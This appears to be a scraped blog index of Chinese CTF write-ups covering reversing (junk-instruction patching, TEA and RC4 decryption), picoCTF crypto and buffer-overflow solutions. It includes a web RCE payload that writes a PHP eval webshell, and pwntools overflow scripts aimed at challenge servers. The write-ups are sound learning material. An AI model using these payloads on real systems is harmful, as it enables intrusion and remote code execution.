数据包分析附件里的.exe是压缩包，修改后缀解压。 找到流量包全局搜索flag以及flag其他编码形式。 16进制解码 Misc4工业流量分析 按照时间排序，最先STOP的包。 1flag&#123;ac6417423bb3000c&#125; web rce方法一（打印编码的flag）1ip/?cmd=print(base64_encode(file_get_contents(base64_decode(&quot;ZmxhZy5waHA=&quot;)))); 方法二（写入webshell）直接写入一个webshell 1234file_put_contents( base64_decode(&quot;c2hlbGwucGhw&quot;), // &quot;shell.php&quot; base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;) // &quot;&lt;?php @eval(\\$_POST[x]); ?&gt;&quot;); 进行编码后为： 1ip/?cmd=file_put_contents(base64_decode(&quot;c2hlbGwucGhw&quot;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd web 二次编码直接访问/flag.php就可以得到flag.php web sql直接用sqlmap。","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"[HNCTF 2022 WEEK4]flower plus","slug":"HNCTF-2022-WEEK4-flower-plus","date":"2025-07-14T00:49:30.000Z","updated":"2025-07-14T06:53:00.725Z","comments":true,"path":"2025/07/14/HNCTF-2022-WEEK4-flower-plus/","permalink":"http://example.com/2025/07/14/HNCTF-2022-WEEK4-flower-plus/","excerpt":"","text":"链接 花指令分析 发现花指令 db 0C7h 的“垃圾”作用： 0x4012A6 处的 db 0C7h 是一个数据字节。它被 jnz 指令跳转到，但它本身不是一个有意义的执行路径。它的存在是为了干扰反汇编器的线性分析，使其认为这里存在一个实际的代码分支。反汇编器可能会将 0C7h 解码为 MOV EDI, EBP (如果加上前缀的话)，或者只是一个数据字节，无论哪种，都与正常逻辑不符。 为了不影响汇编器的分析 要把这里进行判断和跳转的都NOP掉 将 push ebx 和 pop ebx 都 NOP 掉的主要原因是为了完全消除这个花指令的副作用和混淆链： 栈平衡： push ebx 和 pop ebx 是一对用来维护栈平衡的操作。如果它们是花指令的一部分，并且它们保存&#x2F;恢复的寄存器值在中间被修改（例如被 xor ebx, ebx 清零），那么这对 push/pop 实际上是无效的或者说是误导性的。它们的存在只是为了让代码看起来更复杂，或者在某些情况下通过不匹配的栈操作来干扰分析。 如果只 NOP 掉中间的跳转，保留 push ebx 和 pop ebx，那么在 push ebx 之后，ebx 立即被清零，然后又被 pop ebx 恢复。这可能会导致 ebx 的值在函数中被不必要地改变和恢复，即使它不是真正需要的。 第二个花指令 执行 0x401358: call loc_40135E: call 指令本身占用 5 个字节 (E8 01 00 00 00)。 call 指令的下一条指令的地址是 0x401358 + 5 = 0x40135D。 CPU 将 0x40135D 压入栈中。此时，0x40135D 就是栈顶的返回地址。 CPU 跳转到 0x40135E 开始执行。 执行 0x40135E: db 36h: 这是一个数据字节，但是 CPU 会尝试将其作为指令执行。这通常是花指令的混淆手法，它可能不会导致崩溃，而是作为无效指令执行或者被后续指令覆盖。 假设它被执行了，或者被跳过了，程序流会继续到 0x40135F。 执行 0x40135F: add dword ptr [esp], 8: 这条指令非常关键。 [esp] 指的是栈顶的内存地址。当前栈顶存放的是 0x40135D（原始返回地址）。 add dword ptr [esp], 8 的作用是：将栈顶存放的那个 dword 值（即 0x40135D）加上 8，然后把结果再写回栈顶。 所以，栈顶的返回地址从 0x40135D 变成了 0x40135D + 8 = 0x401365。 执行 0x401362: retn: retn 指令会从栈顶弹出地址。 它弹出的不再是原始的 0x40135D，而是被 add 指令修改后的 0x401365。 CPU 跳转到 0x401365 开始执行。 原始的返回地址是 0x40135D。如果没有任何 add 操作，retn 会回到 0x40135D。 但是，add dword ptr [esp], 8 将返回地址修改成了 0x401365。 这意味着当 retn 执行时，程序会直接从 0x401365 开始执行， 所以，add dword ptr [esp], 8 的作用就是人为地调整了 retn 的目标地址，使其跳过了 0x40135D 到 0x401364（包含 0x401364）这段区域，直接跳转到 0x401365 去执行。 这就是这种花指令用于混淆控制流的一种常见手法。 所以NOP的范围包括0x401364 为什么是花指令 正常情况下，call 指令会直接跳转到被调用函数的入口点。这个入口点应该是一条合法的可执行指令。 但是在这里，当 call 指令跳转到 0x40135E 时，它遇到的第一个字节是 db 36h。 反汇编器困惑： 静态反汇编器在 0x40135E 看到 db 36h 时，通常会认为这是数据，而不是代码。它可能因此停止对该区域的代码分析，或者产生错误的解码。 CPU 行为： CPU 会尝试将 36h 作为指令来解码执行。如前所述，36h 是一个段超越前缀（SS:）。CPU 会尝试将其与随后的字节组合成一条指令。 如果 36h 后面跟着的字节（即 add dword ptr [esp], 8 的字节码 83）不能与 36h 形成一条合法的指令，或者形成了程序员不期望的指令，这就会导致程序行为异常或崩溃。 然而，在某些复杂的混淆中，可能会利用这种前缀的特性，使得处理器在特定上下文中能正确执行，而反汇编器却难以理解。 call花指令识别 call 目标是数据字节或非指令区。 call 后面紧跟数据定义。 call 目标内部有 add dword ptr [esp], N 来修改返回地址。 最后以 retn 结束，并且 retn 之后的字节可能也是混淆的一部分。 脚本1234567891011121314stae=0x00401006end=0x00401402 for i in range(stae, end+1): if get_wide_dword(i)== 0x01740275: patch_dword(i,0x90909090) patch_dword(i-4,0x90909090) patch_word(i+4,0x9090) patch_word(i-5,0x90) if get_wide_dword(i)== 0x000001E8: if get_wide_dword(i+4)== 0x8336E800: patch_dword(i,0x90909090) patch_dword(i+4,0x90909090) patch_dword(i+8,0x90909090) patch_byte(i+12,0x90) 然后选中函数头U解构 C重构一下就好 就可以看待main函数了 在这个函数中看到RC4的标志 之后经过一个异或 然后进入sub_40128F进行核验 这是其加密后的值 右键 提取数据 异或脚本 123456789101112131415161718192021222324252627a=[0x0000004D, 0xFFFFFFE6, 0x00000049, 0xFFFFFF95, 0x00000003, 0x0000002D, 0x0000002B, 0xFFFFFFBA, 0xFFFFFFEA, 0x0000006D, 0xFFFFFFFF, 0x00000059, 0x00000070, 0x00000000, 0x0000001B, 0xFFFFFFA9, 0x0000002C, 0xFFFFFFB0, 0x00000032, 0xFFFFFF98, 0x0000006F, 0xFFFFFF8C, 0x00000056, 0xFFFFFFA2, 0x0000004C, 0x00000079, 0x0000007F]for i in range(len(a)-1,-1,-1): a[i]^=a[(i+1)%len(a)] print(a[i], end=&#x27; &#x27;)decimal_numbers =ahex_output = []for num in decimal_numbers: unsigned_32bit_num = num &amp; 0xFFFFFFFF hex_str = hex(unsigned_32bit_num)[2:].upper().zfill(8) hex_output.append(&quot;0x&quot; + hex_str)for i in range(0, len(hex_output), 4): print(&quot;, &quot;.join(hex_output[i:i+4])) #十进制50 75 7 4294967205 4294967283 127 16 4294967176 4294967226 10 38 4294967183 4294967188 4294967188 4294967268 4294967229 66 47 4294967237 127 84 121 122 4294967279 4294967206 64 13 #十六进制0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF0x0000007A, 0x00000079, 0x00000054, 0x0000007F0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF880x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA50x00000007, 0x0000004B, 0x00000032 ​ 处理RC4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990def to_unsigned_32bit_and_byte(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFdef to_signed_32bit(n): if n &gt; 0x7FFFFFFF: n -= 0x100000000 return ndef to_unsigned_32bit(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFFFFFFF# --- RC4 阶段 1: KSA (密钥调度算法) ---# 定义: 初始化 S 盒并根据密钥对其进行置换。# 输入: 密钥字节 (key_bytes), 密钥长度模数 (key_mod_len)# 输出: 经过初始置换的 S 盒 (s_box)def s_init(key_bytes, key_mod_len): s_box = list(range(256)) v4_ksa_t_box = [key_bytes[i % key_mod_len] for i in range(256)] j = 0 for i in range(256): j = (v4_ksa_t_box[i] + j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box# --- RC4 阶段 2 &amp; 3: PRGA (伪随机生成算法) &amp; 最终数据处理 ---# 定义:# PRGA: 根据 S 盒生成伪随机密钥流。# 最终数据处理: 使用生成的密钥流对输入数据进行异或操作。# 输入: 待处理数据数组 (data_array), 密钥字节 (key_bytes), # 密钥长度模数 (key_mod_len), 数据长度 (data_len)# 输出: 经过处理后的数据数组 (result_am_array)def rc4_variant_process(data_array, key_bytes, key_mod_len, data_len): # KSA 阶段的调用 s_box = s_init(key_bytes, key_mod_len) l = 0 v9 = 0 # 用于存储生成的密钥流 generated_keystream = [0] * data_len # --- RC4 阶段 2: PRGA (生成密钥流) --- for k in range(data_len): l = (l + 3) % 256 v9 = (v9 + s_box[l] + 1) % 256 s_box[l], s_box[v9] = s_box[v9], s_box[l] generated_keystream[k] = s_box[(s_box[v9] + s_box[l]) % 256] # --- RC4 阶段 3: 最终数据处理 (异或操作) --- result_am_array = list(data_array) for i in range(data_len): result_am_array[i] = to_signed_32bit(to_unsigned_32bit(result_am_array[i]) ^ to_unsigned_32bit(generated_keystream[i])) return result_am_arrayif __name__ == &quot;__main__&quot;: rc4_key_string = &#x27;Hello_Ctfers!!!&#x27; key_as_byte_list = list(map(ord, rc4_key_string)) if len(key_as_byte_list) &lt; 16: key_as_byte_list.append(0) KEY_MOD_LEN = 16 am_initial_hex = [ 0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF, 0x0000007A, 0x00000079, 0x00000054, 0x0000007F, 0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD, 0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F, 0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF88, 0x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA5, 0x00000007, 0x0000004B, 0x00000032 ] am_initial_data = [to_signed_32bit(h) for h in am_initial_hex] n = len(am_initial_data) final_am_values = rc4_variant_process(am_initial_data, key_as_byte_list, KEY_MOD_LEN, n) output_chars = bytearray() for val in final_am_values: output_chars.append(to_unsigned_32bit_and_byte(val)) print(output_chars.decode(&#x27;latin-1&#x27;)) #NSSCTF&#123;Hn_CtF_w111_end_Lol&#125;","categories":[],"tags":[{"name":"花指令","slug":"花指令","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"RC4变式","slug":"RC4变式","permalink":"http://example.com/tags/RC4%E5%8F%98%E5%BC%8F/"}]},{"title":"[HDCTF 2023]enc","slug":"HDCTF-2023-enc","date":"2025-07-11T11:35:05.000Z","updated":"2025-07-14T06:49:28.131Z","comments":true,"path":"2025/07/11/HDCTF-2023-enc/","permalink":"http://example.com/2025/07/11/HDCTF-2023-enc/","excerpt":"","text":"链接 打开进入这个函数 发现TEA加密 分析之后知道 下一步核对的v7和v8都是改变后的密文 v9才是密钥 解密时注意，异或的时候从后往前异或，倒着来 脚本 1234567891011121314151617#tea解密def tea_decrypt(v, k): v0, v1 = v[0], v[1] delta = 0x61C88647 sum = -(delta * 32) &amp; 0xFFFFFFFF for _ in range(32): v1 = (v1 - ((16*v0 + k[2]) ^ (v0 + sum) ^((v0 &gt;&gt;5) + k[3]))) &amp; 0xFFFFFFFF v0 = (v0 - ((16*v1+ k[0]) ^ (v1 + sum) ^((v1 &gt;&gt;5) + k[1]))) &amp; 0xFFFFFFFF sum = (sum + delta) &amp; 0xFFFFFFFF return [v0, v1] # 给定密文v9和密钥v10v9 = [0x60fcdef7,0x236dbec]v10 = [0x12,0x34,0x56,0x78]print(tea_decrypt(v9, v10))//key=3 继续看下面的函数 sub_4113DE —&gt;sub_414C10—&gt;sub_411046—&gt;sub_414B00—&gt;sub_411221—&gt;sub_415340 (char *)a1 或 (_BYTE *)a1 是将整数地址 a1 转换为内存指针。 然后通过 *ptr ^= a3 修改该地址上的内容。 所以是SMC 那下一步就是找到它改变的地址的范围 打开x32xdbg ctrl+g输入00415340 F9运行后会停在这里 所以修改位置的位置头是0x0041D000 长度是0下600 所以在ida中运行脚本 脚本 1234567891011121314151617# 导入 ida_bytes 模块，这是现代 IDA Python 推荐的字节操作方式from ida_bytes import get_byte, patch_byte # 定义操作的起始地址、结束地址和异或密钥start_address = 0x41d000end_address = 0x41E600 # range函数不包含end_addressxor_key = 3 print(&quot;开始批量异或修改...&quot;)# 遍历指定范围内的每个字节并进行异或操作for i in range(start_address, end_address): original_byte = get_byte(i) # 使用 get_byte 从 ida_bytes 模块读取字节 new_byte = original_byte ^ xor_key patch_byte(i, new_byte) # 使用 patch_byte 从 ida_bytes 模块写入字节print(&quot;修改完成&quot;) 之后再在函数头按U结构 再选中范围去C 就可以了 发现是RC4加密 脚本 12345678910111213141516171819202122232425262728293031323334key=list(&#x27;you_are_master&#x27;)content=[0xf,0x94,0xae,0xf2,0xc0,0x57,0xc2,0xe0,0x9a,0x45,0x37,0x50,0xf5,0xa0,0x5e,0xcb,0x2c,0x16,0x28,0x29,0xfe,0xff,0x33,0x46,0xe,0x57,0x82,0x22,0x52,0x26,0x2b,0x6e,0xe4,0x82,0x24]rc4number=0x100s=[0]*rc4numberflag=&#x27;&#x27; def rc4_init(s,key,rc4number): for i in range(rc4number): s[i]=i j=0 for i in range(rc4number): j=(j+s[i]+ord(key[i%len(key)]))%rc4number temp=s[i] s[i]=s[j] s[j]=temp def rc4_endecode(s,content,rc4number): i=0 j=0 for k in range(len(content)): i=(i+1)%rc4number j=(j+s[i])%rc4number temp=s[i] s[i]=s[j] s[j]=temp t=(s[i]+s[j])%rc4number content[k]=chr(content[k]^s[t]) content=&#x27;&#x27;.join(content) print(content) rc4_init(s,key,rc4number)rc4_endecode(s,content,rc4number)","categories":[],"tags":[{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"},{"name":"RC4","slug":"RC4","permalink":"http://example.com/tags/RC4/"}]},{"title":"picoCTF2022","slug":"picoCTF2022","date":"2025-07-10T04:06:13.000Z","updated":"2025-08-02T10:47:10.633Z","comments":true,"path":"2025/07/10/picoCTF2022/","permalink":"http://example.com/2025/07/10/picoCTF2022/","excerpt":"","text":"CRYPTOVigenere题目信息 key CYLAB cipher: rgnoDVD&#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&#125; 题目给了密文和密钥，用随波逐流打开，解密，发现是维吉尼亚加密 flag:picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q} basic-mod1题目信息 描述： 我们发现这个奇怪的消息在服务器上传递，我们认为我们有一个有效的 decrpytion 方案。取每个数字 mod 37 并将其映射到以下字符集：0-25 是字母表（大写），26-35 是十进制数字，36 是下划线。以 picoCTF 标志格式包装解密的消息（即 picoCTF{decrypted_message}） 数字：350 63 353 198 114 369 346 184 202 322 94 235 114 110 185 188 225 212 366 374 261 213 按照题目信息对取模厚的数字根据其ASCLL码修改，并转化为字符输出 123456789101112131415161718def simplify_numbers(numbers): result = [] for num in numbers: remainder = num % 37 if 0 &lt;= remainder &lt;= 25: result.append(chr(ord(&#x27;A&#x27;) + remainder)) elif 26 &lt;= remainder &lt;= 35: result.append(str(remainder - 26)) elif remainder == 36: result.append(&#x27;_&#x27;) else: result.append(f&quot;[&#123;remainder&#125;]&quot;) return &quot;&quot;.join(result)my_numbers = [350, 63, 353, 198, 114, 369, 346, 184, 202, 322, 94, 235, 114, 110, 185, 188, 225, 212, 366, 374, 261, 213]simplified_string = simplify_numbers(my_numbers)print(simplified_string) flag：picoCTF{R0UND_N_R0UND_ADD17EC2} substitution0题目信息 描述： 一条消息进来了，但似乎全都乱七八糟。幸运的是，它似乎一开始就有钥匙。你能破解这个替换密码吗？ 密文： OHNFUMWSVZLXEGCPTAJDYIRKQB Suauypcg Xuwaogf oacju, rvds o waoiu ogf jdoduxq ova, ogf hacywsd eu dsu huudxumace o wxojj noju vg rsvns vd roj ugnxcjuf. Vd roj o huoydvmyx jnoaohouyj, ogf, oddsod dveu, yglgcrg dc godyaoxvjdj—cm ncyaju o wauod pavbu vg o jnvugdvmvn pcvgdcm ivur. Dsuau ruau drc acygf hxonl jpcdj guoa cgu ukdauevdq cm dsu honl, ogf oxcgw cgu guoa dsu cdsua. Dsu jnoxuj ruau uknuufvgwxq soaf ogf wxcjjq, rvds oxx dsuoppuoaognu cm hyagvjsuf wcxf. Dsu ruvwsd cm dsu vgjund roj iuaq aueoalohxu, ogf,dolvgw oxx dsvgwj vgdc ncgjvfuaodvcg, V ncyxf soafxq hxoeu Zypvdua mca svj cpvgvcgaujpundvgw vd. Dsu mxow vj: pvncNDM&#123;5YH5717Y710G_3I0XY710G_03055505&#125; 解密 猜测密钥凯撒密码加密，把第一句作为密钥 flag; picoCTF{5UB5717U710N_3V0LU710N_03055505} RESafe Opener题目信息 描述：你能打开这个保险箱吗？我忘记了保险箱的钥匙，但这个程序应该可以帮助我找回丢失的钥匙。你能帮我打开保险箱吗？将您恢复的密码放入 picoCTF 标志格式，例如：picoCTF{password} 代码 123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.*;import java.util.*; public class SafeOpener &#123; public static void main(String args[]) throws IOException &#123; BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder();//Base6的编码器 String encodedkey = &quot;&quot;; String key = &quot;&quot;; int i = 0; boolean isOpen; while (i &lt; 3) &#123; System.out.print(&quot;Enter password for the safe: &quot;); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes());//对密码进行Base64加密 System.out.println(encodedkey); isOpen = openSafe(encodedkey);//调用方法进行核对 if (!isOpen) &#123; System.out.println(&quot;You have &quot; + (2 - i) + &quot; attempt(s) left&quot;); i++; continue; &#125; break; &#125; &#125; public static boolean openSafe(String password) &#123; String encodedkey = &quot;cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz&quot;;//BASE64加密后的结果 if (password.equals(encodedkey)) &#123; System.out.println(&quot;Sesame open&quot;); return true; &#125; else &#123; System.out.println(&quot;Password is incorrect\\n&quot;); return false; &#125; &#125;&#125; 正如代码中的注释一样，用户输入密码，进行Base64编码，调用函数检验编码厚的数值是否符合指定字符，所以密码就是指定字符Base64解码 flag：picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3} GDB test题目信息 你能得到这面旗帜吗？ 以下是试用说明： 123456$ chmod +x gdbme$ gdb gdbme(gdb) layout asm(gdb) break *(main+99)(gdb) run(gdb) jump *(main+104) 解密 按照给的命令进行操作 flag: picoCTF{d3bugg3r_dr1v3_7776d758} fresh-java题目信息 你能得到这面旗帜吗？对这个 Java 程序进行逆向工程 用jad-gui打开这个文件，发现该密文已将被定义好了 flag：picoCTF{700l1ng_r3qu1r3d_738cac89} file-run1题目信息 已为您提供一个程序，如果您尝试在命令行上运行它会发生什么？ 解密 首先要为程序赋权限 chmod +x ru 运行该程序并且执行命令.&#x2F;run flag:picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b} file-run2题目信息 另一个程序，但这一次，它似乎需要一些输入。如果您尝试在命令行上运行它并输入 “Hello！”会发生什么情况？ 解密 首先要为程序赋权限 chmod +x ru 运行该程序并且执行命令.&#x2F;run Hello! flag:picoCTF{F1r57_4rgum3n7_f65ed63e} Bbbbloat题目信息 你能得到这面旗帜吗？对这个二进制文件进行逆向工程。 解密 分析得到，最喜欢的是数字应该为549255 为文件赋权限 chmod +x Bbbbloat 运行程序./Bbbbloat flag：picoCTF{cu7_7h3_bl047_44f74a60} unpackme题目描述 你能得到这面旗帜吗？对这个二进制文件进行逆向工程。 解密 文件以upx结尾，尝试upx脱壳 之后拖入ida中 发现最喜爱的数字是754635 flag: picoCTF{up&gt;&lt;_m3_f7w_e510a27f} PWNRPS题目描述 这是一个对你玩石头剪刀布的程序。我听说如果你连续赢了 5 次，就会发生好事。可以下载带有标记已编辑的程序源代码 这里 。 解密 主函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int main () &#123; char input[3] = &#123;&#x27;\\0&#x27;&#125;; int command; int r; puts(&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;); puts(&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;); puts(&quot;Are you ready?&quot;); while (true) &#123; puts(&quot;Type &#x27;1&#x27; to play a game&quot;); puts(&quot;Type &#x27;2&#x27; to exit the program&quot;); r = tgetinput(input, 3); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; //前面那些都不重要 if ((command = strtol(input, NULL, 10)) == 0) &#123; puts(&quot;Please put in a valid number&quot;); &#125; else if (command == 1) &#123; printf(&quot;\\n\\n&quot;); if (play()) &#123; wins++; &#125; else &#123; wins = 0; &#125; if (wins &gt;= 5) &#123; puts(&quot;Congrats, here&#x27;s the flag!&quot;); puts(flag); &#125; &#125; else if (command == 2) &#123; return 0; &#125; else &#123; puts(&quot;Please type either 1 or 2&quot;); &#125; &#125; return 0;&#125; 判断胜负 1234567891011121314151617181920212223242526//判断胜负bool play () &#123; char player_turn[100]; srand(time(0));//电脑的出拳设计 int r; printf(&quot;Please make your selection (rock/paper/scissors):\\n&quot;);//校验 r = tgetinput(player_turn, 100); if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; int computer_turn = rand() % 3;//确保在3个手势中随机选择一个 printf(&quot;You played: %s\\n&quot;, player_turn); printf(&quot;The computer played: %s\\n&quot;, hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) &#123;//核验我们所出的是否包含胜利所需要底色那个手势 puts(&quot;You win! Play again?&quot;); return true; &#125; else &#123; puts(&quot;Seems like you didn&#x27;t win this time. Play again?&quot;); return false; &#125;&#125; 所以我们要经过5次循环，且每次循环都要向程序输出rock&#x2F;paper&#x2F;scissors的结合 脚本12345678from pwn import *p = remote(&#x27;saturn.picoctf.net&#x27;, 60179)for i in range(5): p.sendline(b&#x27;1&#x27;) p.sendline(b&#x27;rock/paper/scissors&#x27;)print(p.recvline_contains(b&#x27;picoCTF&#123;&#x27;)) basic-file-exploit 漏洞题目信息 提供的程序允许您写入文件并从中读取您写入的内容。试着玩弄它，看看你是否能打破它！可以下载带有标记已编辑的程序源代码 这里 解密 有分析可得tgetinput用来校验空输入等基本校验工作，data_write数据输入，data_read数据读取，且其中包含flag的输出 由main可以知道。首先选择要进行的模式，且第一次必须先存入，否则无法调用data_read函数 123456789101112131415161718192021222324252627static void data_read() &#123; char entry[4]; long entry_number; char output[100]; int r; memset(output, &#x27;\\0&#x27;, 100); printf(&quot;Please enter the entry number of your data:\\n&quot;); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//尝试将 entry 字符串的开头部分解析成一个十进制的长整型数值， puts(flag); fseek(stdin, 0, SEEK_END); exit(0); &#125; entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output);&#125; 所以重点就是((entry_number = strtol(entry, NULL, 10)) == 0)的输出结果为0 flag:picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F} buffer overflow 0题目信息 让我们从简单的开始，你能溢出正确的缓冲区吗？该程序可在此处获得。您可以查看源代码 这里 。 解密 主函数 signal(11, sigsegv_handler)当程序发生段错误（即收到信号 11，也就是 SIGSEGV）时，不执行默认操作（崩溃），而是跳转到你定义的 sigsegv_handler 函数进行处理。 当你的程序试图访问非法内存地址（如未分配的内存、只读内存、已释放的内存等）时，操作系统会发送这个信号给程序。 默认情况下，收到 SIGSEGV 会导致程序崩溃（段错误）。 示例触发原因： 解引用空指针：*NULL 写入常量字符串：strcpy(&quot;hello&quot;, &quot;world&quot;) 越界访问栈数组、堆数组 使用未初始化的指针 这个对flag.txt文件的操作 相当于bin&#x2F;sh后门函数 它包含了读取flag,并把flag输出在终端 而在 Linux&#x2F;Unix 系统中，/bin/sh 是一个指向系统默认 shell（如 Bash）的可执行文件 sigsegv_handler函数 该函数会输出flag 所以只需要实现就可以输出flag 脚本1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 62318)p.sendline(b&#x27;a&#x27;*20)p.interactive() buffer overflow 1题目描述 控制退货地址现在我们开始烹饪了！您可以溢出缓冲区并返回到程序中的 flag 函数。你可以在这里查看源代码。 解密 var_4 是什么？ 在汇编或反编译工具（如 IDA Pro）中，var_4 是一个由工具自动生成的名称，用于表示一个位于栈上的局部变量。它通常是原始C代码中没有明确命名的变量，或者是编译器为了优化或内部使用而创建的栈空间。 从图片中可以看到，var_4 位于 s 数组的下方（在栈帧中，局部变量通常从 EBP 往下分配）。 var_4 有多大？ 图片中 var_4 对应的汇编指令是 dd ?。 dd 在汇编中是 “Define Doubleword” 的缩写。在 32 位系统中，一个 Doubleword 是 4 字节。 因此，var_4 的大小是 4 字节。 所以垃圾字节要填充36+4+4&#x3D;44个字节 win是后门函数 填充它的地址 脚本1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 59895)p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))p.interactive() buffer overflow 2题目描述 控制返回地址和参数这一次，您需要控制您返回的函数的参数！您可以从此程序中获取标志吗？你可以在这里查看源代码 解密 s距离返回地址是6C+4个字节 要传参，32位是参数从右到左依次压入栈中 win的地址 gdb动调查看python wp.py 执行的函数列表 脚本1234567891011from pwn import *# 本地# ex = process(&#x27;./vuln&#x27;)# 远程p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)p.sendline(payload)# p.interprint(p.recvall()) x-sixty-what题目描述 溢出 x64 代码在此之前的大多数问题是 32 位 x86。现在我们考虑 64 位 x86，它 只是有点不同！使缓冲区溢出，并将返回地址更改为 flag 函数。 下载源代码 。 解密 这一题我错了很久，最后发现考了堆栈平衡:crying_cat_face: 但是也学到了一些gdb调试获取信息的方法 gdb调试获得相关信息 readelf -s vuln显示所有函数的信息（在gdb调试之前） p flag：显示函数flag的信息 （gdb）disassemble vuln：找要填充的字节数（） 64位时是0x40+8 32位时是0x40+4 堆栈平衡同一个程序的每一个 call 指令执行时，rsp（栈指针）的绝对值不一定相同，但其对齐状态是保持一致的。 当 vuln 函数通过 ret 指令跳转到 flag 函数时，flag 函数的入口处 rsp (栈指针) 可能满足 rsp % 16 == 0 (即 16 字节对齐)。但是，flag 函数的序言 (prologue) 通常会 push rbp (将 rbp 压栈)，这会使 rsp 减去 8 字节，导致 rsp % 16 == 8 (8 字节不对齐)。 问题就出在这里：在执行任何 call 指令之前，rsp 必须是 16 字节对齐的。 所以该函数到flag之前要先到ret小工具 使用 ROPgadget (推荐)： 在终端中运行（确保你的 vuln 可执行文件在当前目录）： Bash 1ROPgadget --binary ./vuln --only &quot;ret&quot; 它会列出所有独立的 ret 指令地址。通常你可以选择其中一个地址最小的，或者你觉得“独立”的地址（例如，不在任何重要函数的中间）。0x0040101a 是一个非常常见的备选。 在 GDB&#x2F;pwndbg 中手动查找： 启动 GDB 调试 ./vuln，然后使用 search-pattern 命令查找 ret 指令的机器码 \\xc3： Code snippet 1search-pattern &#x27;\\xc3&#x27; 你也可以使用 disassemble &lt;section_start_address&gt;, &lt;section_end_address&gt; 来反汇编整个代码段，然后手动查找 ret。 直接看出堆栈不平衡 该函数是flag被调用函数输出flag，所以在flag函数中的第一个call的地方下断点 python 你的脚本文件名.py：运行脚本 info registers rsp：查看rsp的寄存器信息 看最后两位 0x48可以整除16，所以现在堆栈平衡了 脚本12345678910111213141516171819from pwn import *# p = process(&#x27;./vuln&#x27;)# gdb.attach(p, gdbscript=&#x27;b *0x08049370\\ncontinue&#x27;)p = remote(&quot;saturn.picoctf.net&quot;, 50442)# 之前找到的 flag 函数地址flag_address = 0x00401236 # 在你的二进制文件中找到一个 ret 小工具的地址# 假设你找到的是 0x0040101a，请替换为你在 GDB/ROPgadget 中找到的实际地址ret_gadget_address = 0x0040101a # 构建 payload：填充 + ret_gadget_address + flag_addresspayload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)p.sendline(payload)print(p.recvall())","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"初识栈溢出","slug":"初识栈溢出","date":"2025-07-05T04:06:13.000Z","updated":"2025-07-25T02:57:08.876Z","comments":true,"path":"2025/07/05/初识栈溢出/","permalink":"http://example.com/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"fun(a,b)调用过程入栈 （1）压入参数 根据调用约定，main函数作为调用者，首先需要将func函数的两个参数a,b压入栈中。 注意压入参数的顺序，首先压入b，接着压入a，也就是说，压入参数的顺序是从右到左。 （2）返回地址压栈 返回地址压栈。main函数为了让func函数调用后正常返回，需要将当前指令（call指令）的下一条指令的地址压入栈中 call指令包含两个步骤：main函数的下一条指令压栈；控制eip为func函数的第一条语句，eip存储着CPU将要执行的指令的地址 （3）func函数运行 func函数需要自己的内部运作空间。可以使用以下指令序列开辟空间：push ebp mov ebp,esp sub esp,28h 这个28h就是开辟的存储func函数的相关内存的空间 mov ebp,esp看似没有变化，但EBP 从“保存调用者基址”变为“当前函数的栈帧基址”。 